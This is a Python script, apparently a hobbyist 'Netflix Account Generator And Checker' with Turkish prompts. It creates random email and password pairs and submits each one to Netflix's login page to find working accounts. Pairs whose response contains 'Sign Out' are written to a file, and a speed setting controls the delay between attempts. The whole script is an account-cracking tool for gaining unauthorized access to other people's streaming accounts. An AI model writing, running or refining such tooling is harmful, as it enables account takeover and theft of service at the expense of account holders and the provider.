print("Owned By Emin INC.")
print("Netflix Account Generator And Checker 1.0")
import random
import string
import time
import requests

def generate_realistic_email():
    domains = ["@outlook.com", "@hotmail.com", "@gmail.com"]
    domain = random.choice(domains)
    first_names = ["john", "emma", "james", "olivia", "michael", "sophia"]
    last_names = ["smith", "johnson", "williams", "brown", "jones", "davis"]
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    username = first_name + last_name + ''.join(random.choices(string.digits, k=random.randint(1, 4)))
    return f"{username}{random.randint(10, 99)}{domain}"

def generate_random_email():
    domains = ["@outlook.com", "@hotmail.com", "@gmail.com"]
    domain = random.choice(domains)
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 12)))
    return f"{username}{random.randint(10, 99)}{domain}"

def generate_random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 16)))

def generate_accounts(num_accounts, mode):
    accounts = []
    for _ in range(num_accounts):
        if mode == "1":
            email = generate_realistic_email()
        else:
            email = generate_random_email()
        password = generate_random_password()
        accounts.append((email, password))
    return accounts

def check_account_validity(email, password):
    url = "https://www.netflix.com/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }
    data = {
        "email": email,
        "password": password
    }
    response = requests.post(url, headers=headers, data=data)
    if "Sign Out" in response.text:
        return True
    else:
        return False

def save_valid_accounts(accounts):
    with open("valid_accounts.txt", "a") as file:
        for email, password in accounts:
            file.write(f"E-posta: {email}, Şifre: {password}\n")

def main():
    num_accounts = int(input("Üretecek hesap miktarını girin: "))

    mode = input("Mod seçin (1: Gerçekçi isimler, 2: Normal): ")
    if mode not in ["1", "2"]:
        print("Geçersiz mod seçimi. Varsayılan olarak normal mod kullanılacak.")
        mode = "2"

    speed_mode = input("Hız modunu seçin (1: Normal, 2: Hızlı): ")
    if speed_mode == "1":
        delay = 1
    elif speed_mode == "2":
        delay = 0.5
    else:
        print("Geçersiz hız modu seçimi. Varsayılan olarak normal hız kullanılacak.")
        delay = 1

    accounts = generate_accounts(num_accounts, mode)
    
    print("Hesapların geçerliliği kontrol ediliyor...")
    valid_accounts = []
    for email, password in accounts:
        time.sleep(delay)  # Hız moduna göre gecikme ekle
        if check_account_validity(email, password):
            print(f"E-posta: {email}, Şifre: {password} - Geçerli")
            valid_accounts.append((email, password))
        else:
            print(f"E-posta: {email}, Şifre: {password} - Geçersiz")
    
    if valid_accounts:
        save_valid_accounts(valid_accounts)
        print("Geçerli hesaplar 'valid_accounts.txt' dosyasına kaydedildi.")

if __name__ == "__main__":
    main()
